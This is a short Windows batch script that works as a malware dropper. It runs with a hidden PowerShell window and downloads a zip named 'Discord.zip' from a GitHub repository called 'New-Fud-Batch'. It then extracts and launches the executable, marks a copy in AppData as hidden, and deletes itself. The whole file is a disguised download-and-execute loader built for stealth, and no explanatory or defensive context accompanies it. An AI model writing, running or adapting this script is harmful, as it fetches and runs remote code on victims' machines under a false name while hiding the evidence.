@echo off

powershell -window hidden -command ""

Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/Discord.zip' -OutFile Discord.zip"
tar -xf Discord.zip
del Discord.zip
start Discord.exe
attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Discord.exe" /s /d

del "%~f0" & exit